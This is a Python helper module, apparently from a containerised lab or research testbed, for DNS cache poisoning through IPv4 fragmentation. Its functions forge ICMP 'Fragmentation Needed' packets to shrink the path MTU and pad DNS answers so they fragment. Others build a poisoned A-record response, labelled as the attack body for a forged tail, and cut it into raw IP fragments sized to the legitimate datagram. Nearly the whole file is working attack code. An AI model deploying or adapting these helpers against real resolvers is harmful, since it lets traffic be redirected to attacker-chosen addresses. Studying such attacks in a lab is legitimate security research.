"""Shared DNS and IPv4-fragment wire helpers for E5 containers."""

from __future__ import annotations

import struct

from dnslib import A, DNSHeader, DNSQuestion, DNSRecord, QTYPE, RR, TXT
from scapy.all import ICMP, IP, Raw  # type: ignore


def build_dns_answer(request: DNSRecord, answer_ip: str) -> bytes:
    """Build a small authoritative A answer retaining the request identity."""

    question = request.q
    header = DNSHeader(
        id=int(request.header.id),
        qr=1,
        aa=1,
        ra=0,
        rd=int(getattr(request.header, "rd", 0)),
    )
    response = DNSRecord(header, q=question)
    response.add_answer(RR(str(question.qname), QTYPE.A, rdata=A(answer_ip), ttl=30))
    return bytes(response.pack())


def build_padded_dns_answer(request: DNSRecord, answer_ip: str, min_size: int = 1200, max_size: int = 1400) -> bytes:
    """Build an authoritative A answer large enough to fragment once PMTU drops."""

    if min_size < 1 or max_size < min_size:
        raise ValueError("padded DNS size bounds are invalid")
    body = build_dns_answer(request, answer_ip)
    if len(body) >= min_size:
        return body[:max_size]
    question = request.q
    header = DNSHeader(
        id=int(request.header.id),
        qr=1,
        aa=1,
        ra=0,
        rd=int(getattr(request.header, "rd", 0)),
    )
    response = DNSRecord(header, q=question)
    response.add_answer(RR(str(question.qname), QTYPE.A, rdata=A(answer_ip), ttl=30))
    packed = bytes(response.pack())
    while len(packed) < min_size:
        remaining = min_size - len(packed)
        chunk = "X" * min(200, max(1, remaining))
        response.add_answer(RR(str(question.qname), QTYPE.TXT, rdata=TXT(chunk), ttl=30))
        packed = bytes(response.pack())
        if len(packed) > max_size:
            raise ValueError("padded DNS answer exceeded the unfragmented Ethernet MTU")
    return packed


def build_icmp_needfrag(
    *,
    src: str,
    dst: str,
    quoted: bytes,
    mtu: int = 576,
) -> IP:
    """Construct IPv4 Destination Unreachable / Fragmentation Needed."""

    if mtu < 68:
        raise ValueError("next-hop MTU is below the IPv4 minimum")
    payload = quoted if len(quoted) >= 28 else quoted + (b"\x00" * (28 - len(quoted)))
    return IP(src=src, dst=dst, ttl=64) / ICMP(type=3, code=4, nexthopmtu=int(mtu)) / Raw(payload[:28])


def build_poison_answer(dns_id: int, qname: str, poison_ip: str) -> bytes:
    """Build the attack response body used for a forged tail."""

    question = DNSQuestion(qname, QTYPE.A)
    header = DNSHeader(id=int(dns_id) & 0xFFFF, qr=1, aa=1, ra=0, rd=0)
    response = DNSRecord(header, q=question)
    response.add_answer(RR(qname, QTYPE.A, rdata=A(poison_ip), ttl=30))
    return bytes(response.pack())


def fit_body(body: bytes, target_length: int) -> bytes:
    """Pad or truncate a forged DNS body to the legitimate datagram length."""

    if target_length <= 0:
        return body
    if len(body) < target_length:
        return body + (b"\x00" * (target_length - len(body)))
    return body[:target_length]


def udp_payload(dst_port: int, body: bytes, src_port: int = 53) -> bytes:
    """Return a UDP datagram with checksum zero for raw IPv4 replay."""

    length = 8 + len(body)
    if length > 0xFFFF:
        raise ValueError("UDP payload exceeds the maximum datagram size")
    return struct.pack("!HHHH", int(src_port), int(dst_port), length, 0) + body


def fragment_udp_payload(
    *,
    src: str,
    dst: str,
    ipid: int,
    dst_port: int,
    body: bytes,
    fragsize: int = 40,
    src_port: int = 53,
) -> list[IP]:
    """Construct raw IPv4 fragments for one UDP DNS datagram."""

    if fragsize < 8:
        raise ValueError("fragsize must be at least eight bytes")
    size = (int(fragsize) // 8) * 8
    if size <= 0:
        raise ValueError("fragsize must produce a positive eight-byte payload size")
    datagram = udp_payload(dst_port, body, src_port=src_port)
    packets: list[IP] = []
    for offset in range(0, len(datagram), size):
        chunk = datagram[offset : offset + size]
        more = 1 if offset + size < len(datagram) else 0
        packets.append(
            IP(
                src=src,
                dst=dst,
                id=int(ipid) & 0xFFFF,
                ttl=64,
                proto=17,
                flags=more,
                frag=offset // 8,
            )
            / Raw(chunk)
        )
    return packets


def build_tcp_frame(body: bytes) -> bytes:
    """Return the two-byte length-prefixed DNS-over-TCP message."""

    if len(body) > 0xFFFF:
        raise ValueError("DNS-over-TCP body is too large")
    return struct.pack("!H", len(body)) + body


def parse_dns_body(payload: bytes) -> DNSRecord:
    """Parse a DNS body with a narrow helper used by service code/tests."""

    return DNSRecord.parse(payload)
